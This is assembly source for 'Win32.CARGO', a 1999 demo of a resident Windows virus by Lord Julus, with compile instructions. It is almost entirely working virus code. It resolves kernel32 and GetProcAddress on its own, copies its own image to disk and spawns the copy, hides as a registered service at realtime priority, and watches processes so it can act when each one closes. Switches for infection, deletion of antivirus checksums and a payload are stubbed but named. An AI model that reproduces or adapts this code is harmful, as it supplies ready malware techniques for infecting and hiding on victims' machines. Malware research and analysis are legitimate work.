comment $

                          A DEMO FOR THE CARGO VIRUS

 ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

                                    WIN32

                    ±±±±±±  ±±±±±±  ±±±±±± ±±±±±±  ±±±±±±
                    ±±      ±±  ±±  ±±  ±± ±±      ±±  ±±
                    ±±      ±±±±±±  ±±±±±  ±±  ±±  ±±  ±±
                    ±±±±±±  ±±  ±±  ±±  ±± ±±±±±±  ±±±±±±

                                by Lord Julus

                                   (C) 1999

 ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

        Compile with: tasm32 -m -mx spawn.asm
                      tlink32 -Tpe -aa -c spawn,,,import32.lib

        Run  the  file spawn.exe and then open and close processes to see how
 they  get  cought after they are closed (a messagebox containing the name is
 displayed).

                                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                                            ³   Lord Julus (C) 1999  ³
                                            ÀÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¾
        $


;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

.586p
.model flat, stdcall
jumps

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

extrn MessageBoxA:proc
extrn ExitProcess:proc

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

TRUE            =       1              ;
FALSE           =       0              ;
                                       ;
DEBUG           =       TRUE           ;
                                       ;
IF              DEBUG                  ; if debug is on, only *GOAT.EXE
                exename =  "GOAT"      ; files are infected,
                RETRO   =  FALSE       ; no av checksums are deleted
                PAYLOAD =  FALSE       ; and no payload is ran
ELSE                                   ;
                RETRO   = TRUE         ;
                PAYLOAD = TRUE         ;
ENDIF                                  ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

.data
db 0

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

.code

start:                                             ;
       pushad                                      ;
       call get_delta                              ;
                                                   ;
get_delta:                                         ;
       pop ebp                                     ;
       sub ebp, offset get_delta                   ;
       mov [ebp+delta], ebp                        ; save delta for later

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

       lea eax, [ebp+ExceptionExit]                ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

       mov eax, [esp+28h]                          ; first let's locate the
       lea edx, [ebp+kernel32_name]                ; kernel32 base address
       call LocateKernel32                         ;
       jc exit                                     ;
       mov dword ptr [ebp+k32], eax                ; save it...

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

       lea edx, dword ptr [ebp+getprocaddress]     ; then let's locate
       call LocateGetProcAddress                   ; GetProcAddress
       jc exit                                     ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

       mov ebx, eax                                ; now let's locate all
       mov eax, dword ptr [ebp+k32]                ; the K32 apis we need
       lea edi, dword ptr [ebp+k32_names]          ; furthure...
       lea esi, dword ptr [ebp+k32_apis ]          ;
       call LocateApiAddresses                     ;
       jc exit

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

       lea edi, dword ptr [ebp+user32_name]        ; Locate USER32
       call LocateModuleBase                       ; module base
       jc exit                                     ;
       mov [ebp+u32], eax                          ;
       lea edi, dword ptr [ebp+u32_names]          ; and it's apis
       lea esi, dword ptr [ebp+u32_apis ]          ;
       call LocateApiAddresses                     ;
       jc exit                                     ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

       call resident                               ; go resident
       jmp exit                                    ;

copyright db 0ah,0dh,0ah,0dh," Win32.CARGO V0.5 - A win32 resident virus "
          db 0ah,0dh,0ah,0dh," copyright Lord Julus (C) 1999             "
          db 0ah,0dh,0ah,0dh
          db "DEMO VARIANT !!! NO INFECTION !!!"
          db 0ah,0dh,0ah,0dh

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
; Here we spawn the resident file, or handle the file checks
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

resident proc near                           ;
      lea eax, [ebp+mutex]                   ; create a process relative
      push eax                               ; mutex by the name "cargo".
      push 1                                 ; If the mutex already existed
      push 0                                 ; it means we are already
      call [ebp+_CreateMutexA]               ; resident, otherwise we must
      call [ebp+_GetLastError]               ; go resident.
      or eax, eax                            ;
      jnz spawned                            ;
                                             ;
      pushad                                 ;
      push 0                                 ; file attributes
      push 0                                 ; ""
      push 2                                 ; Create New File
      push 0                                 ; Security option = default
      push 1                                 ; File share for read
      push 80000000h or 40000000h            ; General write and read
      lea eax, [ebp+spawnname]               ;
      push eax                               ; pointer to filename
      Call [ebp+_CreateFileA]                ;
                                             ;
      cmp eax, -1                            ; failed to create?
      je exit                                ;
      mov [ebp+filehandle], eax              ;
      popad                                  ;

; Let's dump the running file to disk under the new name...

      mov esi, [ebp+imagebase]               ; first check that it is a
      cmp word ptr [esi], 'ZM'               ; valid MS-DOS file...
      jne exit                               ;
      cmp word ptr [esi.MZ_lfarlc], 40h      ; check the NewExe marker
      jne exit                               ;
      mov esi, [esi.MZ_lfanew]               ; locate PE header offset
      add esi, [ebp+imagebase]               ;
      push 200h                              ; check if we can read
      push esi                               ; the ammount of memo from there
      call [ebp+_IsBadReadPtr]               ;
      or eax, eax                            ;
      jnz exit                               ;
      cmp word ptr [esi], 'EP'               ; is it the PE header?
      jne exit                               ;
      xor eax, eax                           ;
      mov ax, [esi.NumberOfSections]         ; take number of sections
      push eax                               ; and remember them
      add esi, IMAGE_FILE_HEADER_SIZE        ; go to optional header
      mov edx, [esi.OH_FileAlignment]        ; save file alignment
      mov [ebp+filealign], edx               ;
      add esi, IMAGE_OPTIONAL_HEADER_SIZE    ; go to the first section header
      mov ecx, IMAGE_SECTION_HEADER_SIZE     ; multiplicator
      mul ecx                                ; obtain all section headers size
      mov edx, eax                           ; save it to edx
      push edx                               ; and save it on the stack
      add esi, eax                           ; go at the end
      push esi                               ; write down all the headers
      sub esi, [ebp+imagebase]               ; in the file to the new dest
      push 0                                 ; file.
      lea edx, nob                           ;
      push edx                               ;
      push esi                               ;
      push [ebp+imagebase]                   ;
      push [ebp+filehandle]                  ;
      call [ebp+_WriteFile]                  ;
      pop esi                                ;
                                             ;
      pop edx                                ; restore section headers size
      pop ecx                                ; cx = number of sections
      sub esi, edx                           ; go to the first section header
                                             ;
      pushad                                 ; save all regs
                                             ;
      pushad                                 ; save all regs
      mov edi, 09999999h                     ; now we will try to locate the
                                             ; smallest PointerToRawData to
locate_smallest_pointer:                     ; know which section body comes
      mov eax, [esi.SH_PointerToRawData]     ; first, in case they are
      cmp eax, edi                           ; mangled relative to their
      jnb still_smaller                      ; headers.
      xchg eax, edi                          ;
                                             ;
still_smaller:                               ;
      add esi, IMAGE_SECTION_HEADER_SIZE     ;
      loop locate_smallest_pointer           ;
      mov [ebp+temp], edi                    ;
      popad                                  ; restore registers
                                             ;
      push ecx                               ;
      push edx                               ;
      push 1                                 ;
      push 0                                 ;
      push 0                                 ;
      push [ebp+filehandle]                  ;
      call [ebp+_SetFilePointer]             ; get in EAX how much we wrote
      pop edx                                ; already in the destination
      pop ecx                                ; file.
                                             ;
      mov edi, [ebp+temp]                    ; EDI is the first data offset
      sub edi, eax                           ; and we must pad with the
      add esi, edx                           ; difference!!
                                             ;
      push 0                                 ;
      lea eax, nob                           ;
      push eax                               ;
      push edi                               ;
      push esi                               ;
      push [ebp+filehandle]                  ;
      call [ebp+_WriteFile]                  ; write difference!!
                                             ;
      popad                                  ; restore regs
                                             ;
                                             ;
section_dump_loop:                           ; now let's dump the sections
      push ecx                               ; bodies.
      mov edi, [esi.SH_VirtualAddress]       ; take it from memory, aligned
      add edi, [ebp+imagebase]               ; to imagebase
      mov eax, dword ptr [esi.SH_VirtualSize]; now choose the smallest between
      mov ecx, dword ptr [esi.SH_SizeOfRawData]; VirtualSize and SizeOfRawData
      cmp ecx, eax                           ; to solve the Borland/MicroSoft
      jnb ok_                                ; difference in linking.
      xchg eax, ecx                          ;
                                             ;
ok_:                                         ;
      mov ecx, [ebp+filealign]               ; now we must align the size
      push eax                               ; before alignment to the
      push ecx                               ; file alignment, because in
      xor edx, edx                           ; memory it was aligned to
      div ecx                                ; section alignment
      cmp edx, 0                             ;
      jne more                               ;
      pop ecx                                ;
      pop eax                                ;
      jmp no_more                            ;
                                             ;
more:                                        ;
      pop ecx                                ;
      sub ecx, edx                           ;
      pop eax                                ;
      add eax, ecx                           ; eax= size aligned
                                             ;
no_more:                                     ;
      push 0                                 ; write the section to the
      lea ecx, nob                           ;
      push ecx                               ; file...
      push eax                               ;
      push edi                               ;
      push filehandle                        ;
      call [ebp+_WriteFile]                  ;
                                             ;
      pop ecx                                ; restore index
      add esi, IMAGE_SECTION_HEADER_SIZE     ; get next section...
      loop section_dump_loop                 ;
                                             ;
      push [ebp+filehandle]                  ; close destination file!
      call [ebp+_CloseHandle]                ;

; The resulting file will be smaller than the original because no filesize
; padding is done.
                                              ;
go_res:                                       ; let's go resident!
       lea eax, [ebp+startupinfo]             ;
       push eax                               ; get the startup info
       call [ebp+_GetStartupInfoA]            ;
                                              ;
       lea eax, [ebp+processinfo]             ;
       push eax                               ; and spawn ourselves
       lea eax, [ebp+startupinfo]             ;
       push eax                               ;
       push 0                                 ;
       push 0                                 ;
       push 67108928h                         ;
       push 0                                 ; do not inherit handles
       push 0                                 ;
       push 0                                 ;
       lea eax, [ebp+spawnname]               ;
       push eax                               ;
       push 0                                 ;
       call [ebp+_CreateProcessA]             ; Run the Process!!
                                              ;
       lea esi, [ebp+processinfo]             ; close the new process handle
       push [esi.PI_hProcess]                 ;
       call [ebp+_CloseHandle]                ;
                                              ;
       push 1000                              ; allow new process to start
       call [ebp+_Sleep]                      ;
                                              ;
       jmp exit                               ; return to host!

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±


;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

spawned:                                     ;
      lea eax, [ebp+mutex2]                  ; create a process relative
      push eax                               ; mutex by the name "ograc".
      push 1                                 ; If the mutex already existed
      push 0                                 ; it means we are already
      call [ebp+_CreateMutexA]               ; resident, otherwise we must
      call [ebp+_GetLastError]               ; quit!
      or eax, eax                            ;
      jnz exit                               ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

       call [ebp+_GetCurrentProcess]  ; get then current process handle
       push 100h                      ; realtime priority class
       push eax                       ; handle of current process
       call [ebp+_SetPriorityClass]   ; set priority to realtime
                                      ;
       push 1                         ; Register the current running
       push 0                         ; process as a service.
       call [ebp+_RegisterServiceProcess];
                                      ;
                                      ;
      mov [ebp+firstsize], 0         ; reset the memory size of both arrays
      mov [ebp+secondsize], 0        ; to 0.
      lea eax, [ebp+threadid]        ; Prepare to create a new thread for
      push eax                       ; the current process.
      push 4                         ; Create it Suspended
      push 0                         ;
      lea eax, [ebp+VirusThread]     ;
      push eax                       ;
      push 0h                        ;
      push 0                         ;
      call [ebp+_CreateThread]       ; do it!
                                     ;
      mov [ebp+hthread], eax         ; save thread handle
                                     ;
      push 15                        ; set thread priority to
      push [ebp+hthread]             ; TIME_CRITICAL
      call [ebp+_SetThreadPriority]  ; (gives us a 31 priority level cos'
                                     ; it's combined with a REALTIME process)
      push [ebp+hthread]             ;
      call [ebp+_ResumeThread]       ; start thread
                                     ;
      push -1                        ; stop current thread and wait for
      push [ebp+hthread]             ; the other to finish
      call [ebp+_WaitForSingleObject];
                                     ;
      push 0                         ; quit...
      call [ebp+_ExitProcess]        ;
                                     ;
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
                                     ;
VirusThread proc near                ; This is the resident part.
       call thread_delta             ; we must get the delta again because
                                     ; EBP gets smashed...
thread_delta:                        ;
       pop ebp                       ;
       sub ebp, offset thread_delta  ;
                                     ;
       mov [ebp+error], 0            ; error flag
                                     ;
again_again:                         ;
       call FillFirstArray           ; Create the first process names array
                                     ;
again:                               ;
       cmp [ebp+error], 1            ; if there was an error, abort!
       je exit_thread                ;
       push 500                      ;
       call [ebp+_Sleep]             ; sleep half a second
       call FillSecondArray          ; Create the second process names array
       call CompareArrays            ; compare the arrays
       jnc again                     ; and loop...
       jmp again_again               ;
                                     ;
exit_thread:                         ;
       push 0                        ; finish current thread...
       call [ebp+_ExitThread]        ;
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

FillFirstArray proc near             ; Here we will call the walk procedure
       pushad                        ; in order to fill the first array
                                     ;
       cmp [ebp+firstmemo], 0        ; free memory only if it was
       je nope1                      ; already allocated...
       push [ebp+firstmemo]          ; If we free the first memory area,
       call [ebp+_GlobalFree]        ; then we *must* free the second memory
                                     ; area again, otherwise next time we
nope1:                               ; need more memory, the GlobalReAlloc
       cmp [ebp+secondmemo], 0       ; will fail because not enough free
       je nope2                      ; *contigous* memory will be available.
       push [ebp+secondmemo]         ;
       call [ebp+_GlobalFree]        ;
                                     ;
nope2:                               ;
       call WalkProcesses            ;
       mov eax, [ebp+temp_mem_ptr]   ; save the pointer to the memory area
       mov [ebp+firstmemo], eax      ;
       mov eax, [ebp+temp_mem_sze]   ; and the size of the memory
       mov [ebp+firstsize], eax      ;
       popad                         ;
       ret                           ;
FillFirstArray endp                  ;
                                     ;
FillSecondArray proc near            ; This is the same thing, but for the
       pushad                        ; second memory array.
                                     ;
       cmp [ebp+secondmemo], 0       ;
       je nope3                      ;
       push [ebp+secondmemo]         ;
       call [ebp+_GlobalFree]        ;
                                     ;
nope3:;                              ;
       call WalkProcesses            ;
       mov eax, [ebp+temp_mem_ptr]   ;
       mov [ebp+secondmemo], eax     ;
       mov eax, [ebp+temp_mem_sze]   ;
       mov [ebp+secondsize], eax     ;
       popad                         ;
       ret                           ;
FillSecondArray endp                 ;
                                     ;
WalkProcesses proc near              ; Get the running processes...
      push 0                         ; snap for the current process
      push 2                         ; snap processes
      call [ebp+_CreateToolhelp32Snapshot]  ; create toolhelp handle
      mov [ebp+t32h], eax            ; save toolhelp handle
      cmp eax, -1                    ; was it a failure?
      je exit                        ;
                                     ;
      lea eax, [ebp+process32]       ; point the process32 structure
      push eax                       ;
      mov ecx, dword ptr [ebp+t32h]  ;
      push ecx                       ;
      call [ebp+_Process32First]     ; get first process
      or eax, eax                    ; no process?
      jz exit                        ; (thx JQwerty for the bug solving!)
                                     ;
      call init_memo                 ; init memory array!
      cmp [ebp+error], 1             ; if error, it means we don't have
      je no_next                     ; enough memory...
                                     ;
next:                                ;
      lea eax, [ebp+process32]       ; get next process
      push eax                       ;
      mov ecx, dword ptr [ebp+t32h]  ;
      push ecx                       ;
      call [ebp+_Process32Next]      ;
      or eax, eax                    ;
      jz no_next                     ;
      call incr_memo                 ; increment memory array!
      cmp [ebp+error], 1             ;
      je no_next                     ;
      jmp next                       ;
                                     ;
no_next:                             ;
      push [ebp+t32h]                ; close the toolhelp handle...
      call [ebp+_CloseHandle]        ;
      ret                            ;
                                     ;
init_memo:                           ; Here we init the memory array
       lea esi, [ebp+process32]      ; get pointer to process data
       lea ebx, [esi.szExeName]      ; get pointer to name
       push ebx                      ; save it...
       call [ebp+_lstrlen]           ; get length of name
       inc eax                       ; +1 for terminatorZ
       mov [ebp+temp_mem_sze], eax   ; initiate memory size
       push eax                      ; size to allocate
       push 040h                     ; fixed memory and zeroed
       call [ebp+_GlobalAlloc]       ; allocate memory
       cmp eax, 0                    ; if error, set error flag...
       jne no_error1                 ;
       mov [ebp+error], 1            ;
       ret                           ;
                                     ;
no_error1:                           ;
       mov [ebp+temp_mem_ptr], eax   ; save memory handle
       push ebx                      ; source -> process path+name
       push eax                      ; destination -> memory
       call [ebp+_lstrcpy]           ; copy file name to memory
       ret                           ;
                                     ;
incr_memo:                           ; Here we add names to memory
       lea esi, [ebp+process32]      ; get pointer to the process data
       lea ebx, [esi.szExeName]      ; get pointer to the process name
       push ebx                      ; save pointer
       call [ebp+_lstrlen]           ; get length of name
       inc eax                       ; +terminatorZ
       add [ebp+temp_mem_sze], eax   ; increase memory size
       mov edx, eax                  ; save increasement
       push edx                      ;
       push 40h                      ; fixed memory
       push [ebp+temp_mem_sze]       ; new size
       push [ebp+temp_mem_ptr]       ; memory handle
       call [ebp+_GlobalReAlloc]     ; Reallocate new memory size
       cmp eax, 0                    ; error?
       jne no_error2                 ;
       mov [ebp+error], 1            ;
       pop edx                       ;
       ret                           ;
                                     ;
no_error2:                           ;
       mov eax, [ebp+temp_mem_sze]   ; now locate the end of the previous
       pop edx                       ; memory, which leads us right after
       sub eax, edx                  ; the last terminatorZ, where we need
       mov esi, [ebp+temp_mem_ptr]   ; to add the new file name...
       add esi, eax                  ; go to the new empty space
       push ebx                      ; source
       push esi                      ; destination
       call [ebp+_lstrcpy]           ; and insert the new name there
       ret                           ;
WalkProcesses endp                   ;
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
                                     ;
CompareArrays proc near              ;
       mov esi, [ebp+firstmemo]      ; point first array
       mov ecx, [ebp+firstsize]      ; and its size
       call get_item_no              ; and get the number of items
       mov [ebp+firstindex], eax     ; save the no. of items in the array#1
       mov esi, [ebp+secondmemo]     ; point second array
       mov ecx, [ebp+secondsize]     ; and its size
       call get_item_no              ; and get number of items
       mov [ebp+secondindex], eax    ; save the no. of items in the array#2
                                     ;
       mov ecx, [ebp+firstindex]     ; scan until first index
       mov esi, [ebp+firstmemo]      ;
       mov edi, [ebp+secondmemo]     ;
       mov [ebp+flag], 0             ;
                                     ;
first_array_scan:                    ;
       push ecx                      ; save index
                                     ;
       mov ecx, [ebp+secondindex]    ; get second index
       mov edi, [ebp+secondmemo]     ;
                                     ;
second_array_scan:                   ;
       push ecx                      ; save second index
       mov edx, esi                  ; save name
       mov [ebp+flag], 0             ;
       push esi                      ; get length of one string in array#1
       call [ebp+_lstrlen]           ;
       inc eax                       ;
       mov ecx, eax                  ;
       rep cmpsb                     ; is it in array#2 also?
       je name_found                 ; ok
                                     ;
name_not_found:                      ; if name is not found, get another
       xor eax, eax                  ; locate next name in the array#2
       mov ecx, 1000                 ;
       repnz scasb                   ;
       mov esi, edx                  ; restore name to scan
       jmp continue_loop             ;
                                     ;
name_found:                          ;
       pop ecx                       ; if name is found force exit from the
       push 1                        ; loop...
       mov [ebp+flag], 1             ; and mark the flag!
                                     ;
continue_loop:                       ;
       pop ecx                       ; restore and...
       loop second_array_scan        ; ...loop
       cmp [ebp+flag], 0             ; if flag is still 0 we didn't find one
       je One_item_missing           ; item in array#2
                                     ;
       pop ecx                       ; restore first index
       loop first_array_scan         ; and loop
       jmp All_items_match           ;
                                     ;
One_item_missing:                    ; one item missing from array#2
       pop ecx                       ; get it off the stack
       mov eax, edx                  ; go and handle it!
       call HandleClosedProcess      ;
       stc                           ;
       jmp quit                      ;
                                     ;
All_items_match:                     ; If all items match, but the array#2
       mov eax, [ebp+secondindex]    ; is bigger then array#1 then more
       cmp eax, [ebp+firstindex]     ; processes were opened so we must
       ja setcarry                   ; rescan...
       clc                           ;
       ret                           ;
                                     ;
setcarry:                            ;
       stc                           ;
                                     ;
quit:                                ;
       ret                           ;
CompareArrays endp                   ;
                                     ;
get_item_no proc near                ; here we simply locate the number of
       xor eax, eax                  ; terminatorZ we find, giving us the
       inc esi                       ; number of asciiz strings.
                                     ;
count_loop:                          ;
       cmp byte ptr [esi], 0         ;
       jne no_match                  ;
       cmp byte ptr [esi-1], 0       ; skip final zero...
       je quit_now                   ;
       inc eax                       ;
                                     ;
no_match:                            ;
       inc esi                       ;
       loop count_loop               ;
                                     ;
quit_now:                            ;
       ret                           ;
get_item_no endp                     ;
                                     ;
HandleClosedProcess proc near        ; When we are here, eax points the
       pushad                        ; name of a valid win32 file which can
                                     ; be handled.
                                     ;
       IF DEBUG                      ; if debug is on, you can remove
       mov esi, eax                  ; Cargo from memory by running any
       push eax                      ;
       push eax                      ; application called KILL.EXE.
       call [ebp+_lstrlen]           ;
       add esi, eax                  ;
       sub esi, 8                    ;
       cmp [esi], 'LLIK'             ;
       jne no_quit                   ;
       mov [ebp+error], 1            ;
       ENDIF                         ;
                                     ;
no_quit:                             ;
       pop ebx                       ;
       push 1000h                    ; AlwaysOnTop + Ok button
       lea eax, [ebp+windowtitle]    ;
       push eax                      ;
       push ebx                      ;
       push 0                        ;
       call [ebp+_MessageBoxA]       ; display message
                                     ;
       popad                         ;
       ret                           ;
HandleClosedProcess endp             ;
VirusThread endp                     ;
resident endp                        ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
; Locate Kernel32 base address
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;
; Entry:  EAX = dword on stack at startup
;         EDX = pointer to kernel32 name
;
; Return: EAX = base address of kernel32 if success
;         EAX = 0, CF set if fail

LocateKernel32 proc near
       pushad                                      ; save all registers
       lea ebx, dword ptr [ebp+try_method_2_error] ; first set up a seh
       push ebx                                    ; frame so that if our
       push dword ptr fs:[0]                       ; first method crashes
       mov fs:[0], esp                             ; we will find ourselves
                                                   ; in the second method
locateloop:                                        ;
       cmp dword ptr [eax+0b4h], eax               ; first method looks for
       je found_k32_kill_seh                       ; the k32 by checking for
       dec eax                                     ; the equal dword at 0b4
       cmp eax, 40000000h                          ;
       jbe try_method_2                            ;
       jmp locateloop                              ;
                                                   ;
found_k32_kill_seh:                                ; if we found it, then we
       pop dword ptr fs:[0]                        ; must destroy the temp
       add esp, 4                                  ; seh frame
       mov dr0, eax                                ; save k32 base in DR0
       jmp found_k32                               ;
                                                   ;
try_method_2_error:                                ; if the first method gave
        mov esp, [esp+8]                           ; and exception error we
                                                   ; must restore the stack
try_method_2:                                      ;
       pop dword ptr fs:[0]                        ; restore the seh state
       add esp, 4                                  ;
       popad                                       ; restore registers and
       pushad                                      ; save them again
                                                   ; and go on w/ method two
       mov ebx, dword ptr [ebp+imagebase]          ; now put imagebase in ebx
       mov esi, ebx                                ;
       cmp word ptr [esi], 'ZM'                    ; check if it is an EXE
       jne notfound_k32                            ;
       mov esi, dword ptr [esi.MZ_lfanew]          ; get pointer to PE
       cmp esi, 1000h                              ; too far away?
       jae notfound_k32                            ;
       add esi, ebx                                ;
       cmp word ptr [esi], 'EP'                    ; is it a PE?
       jne notfound_k32                            ;
       add esi, IMAGE_FILE_HEADER_SIZE             ; skip header
       mov edi, dword ptr [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
       add edi, ebx                                ; and get import RVA
       mov ecx, dword ptr [esi.OH_DataDirectory.DE_Import.DD_Size]
       add ecx, edi                                ; and import size
       mov eax, edi                                ; save RVA
                                                   ;
locateloop2:                                       ;
       mov edi, dword ptr [edi.ID_Name]            ; get the name
       add edi, ebx                                ;
       cmp dword ptr [edi], 'NREK'                 ; and compare to KERN
       je found_the_kernel_import                  ; if it is not that one
       add eax, IMAGE_IMPORT_DESCRIPTOR_SIZE       ; skip to the next desc.
       mov edi, eax                                ;
       cmp edi, ecx                                ; but not beyond the size
       jae notfound_k32                            ; of the descriptor
       jmp locateloop2                             ;
                                                   ;
found_the_kernel_import:                           ; if we found the kernel
       mov edi, eax                                ; import descriptor
       mov esi, dword ptr [edi.ID_FirstThunk]      ; take the pointer to
       add esi, ebx                                ; addresses
       mov edi, dword ptr [edi.ID_Characteristics] ; and the pointer to
       add edi, ebx                                ; names
                                                   ;
gha_locate_loop:                                   ;
       push edi                                    ; save pointer to names
       mov edi, dword ptr [edi.TD_AddressOfData]   ; go to the actual thunk
       add edi, ebx                                ;
       add edi, 2                                  ; and skip the hint
                                                   ;
       push edi esi                                ; save these
       lea esi, dword ptr [ebp+getmodulehandle]    ; and point the name of
       mov ecx, getmodulehandlelen                 ; GetModuleHandleA
       rep cmpsb                                   ; see if it is that one
       je found_getmodulehandle                    ; if so...
       pop esi edi                                 ; otherwise restore
                                                   ;
       pop edi                                     ; restore arrays indexes
       add edi, 4                                  ; and skip to next
       add esi, 4                                  ;
       cmp dword ptr [esi], 0                      ; 0? -> end of import
       je notfound_k32                             ;
       jmp gha_locate_loop                         ;
                                                   ;
found_getmodulehandle:                             ;
       pop esi                                     ; restore stack
       pop edi                                     ;
       pop edi                                     ;
                                                   ;
       push edx                                    ; push kernel32 name
       mov esi, [esi]                              ; esi = GetModuleHandleA
       call esi                                    ; address...
       mov dr0, eax                                ; DR0 holds k32 base!!
       or eax, eax                                 ;
       jz notfound_k32                             ;
                                                   ;
found_k32:                                         ;
       popad                                       ; restore all regs and
       mov eax, dr0                                ; put k32 in EAX
       clc                                         ; and mark success
       ret                                         ;
                                                   ;
notfound_k32:                                      ;
       popad                                       ; restore all regs
       xor eax, eax                                ; and mark the failure...
       stc                                         ;
       ret                                         ;
LocateKernel32 endp                                ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
; Locate GetProcAddress
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;
; Entry:  EAX = base of kernel32
;         EDX = pointer to GetProcAddress name
;
; Return: EAX = address of GetProcAddress if success
;         EAX = 0, CF set if fail

LocateGetProcAddress proc near                     ;
       pushad                                      ;
       mov ebx, eax                                ; save the kernel base
       mov edi, eax                                ;
       cmp word ptr [edi], 'ZM'                    ; is it an exe?
       jne notfoundgpa                             ;
                                                   ;
       mov edi, dword ptr [edi.MZ_lfanew]          ;
       cmp edi, 1000h                              ;
       jae notfoundgpa                             ;
                                                   ;
       add edi, ebx                                ;
       cmp word ptr [edi], 'EP'                    ; is it a PE?
       jne notfoundgpa                             ;
                                                   ;
       add edi, IMAGE_FILE_HEADER_SIZE             ; skip file header
                                                   ;
       mov edi, dword ptr [edi.OH_DataDirectory.DE_Export.DD_VirtualAddress]
       add edi, ebx                                ; and get export RVA
                                                   ;
       mov ecx, dword ptr [edi.ED_NumberOfNames]   ; save number of names
                                                   ; to look into
       mov esi, dword ptr [edi.ED_AddressOfNames]  ; get address of names
       add esi, ebx                                ; align to base rva
                                                   ;
       push edi                                    ; save pointer to export
                                                   ;
gpa_locate_loop:                                   ;
       mov edi, [esi]                              ; get one name address
       add edi, ebx                                ; and align it
                                                   ;
       push ecx esi                                ; save counter and addr.
                                                   ;
       mov esi, edx                                ; compare to GetProcAddress
       mov ecx, getprocaddresslen                  ;
       rep cmpsb                                   ;
       je foundgpa                                 ;
                                                   ;
       pop esi ecx                                 ; restore them
                                                   ;
       add esi, 4                                  ; and get next name
       loop gpa_locate_loop                        ;
                                                   ;
notfoundgpa:                                       ; we didn't find it...
       pop edi                                     ;
       popad                                       ;
       xor eax, eax                                ; mark failure
       stc                                         ;
       ret                                         ;
                                                   ;
foundgpa:                                          ;
       pop esi ecx                                 ; ecx = how many did we
       pop edi                                     ; check from total, but
       sub ecx, dword ptr [edi.ED_NumberOfNames]   ; we need the reminder
       neg ecx                                     ; of the search
       mov eax, dword ptr [edi.ED_AddressOfOrdinals]; get address of ordinals
       add eax, ebx                                ;
       shl ecx, 1                                  ; and look using the index
       add eax, ecx                                ;
       xor ecx, ecx                                ;
       mov cx, word ptr [eax]                      ; take the ordinal
       mov eax, dword ptr [edi.ED_AddressOfFunctions]; take address of funcs.
       add eax, ebx                                ;
       shl ecx, 2                                  ; we look in a dword array
       add eax, ecx                                ; go to the function addr
       mov eax, [eax]                              ; take it's address
       add eax, ebx                                ; and align it to k32 base
       mov dr0, eax                                ; save it in dr0
       popad                                       ; restore all regs
       mov eax, dr0                                ; and mark success
       clc                                         ;
       ret                                         ;
LocateGetProcAddress endp                          ;

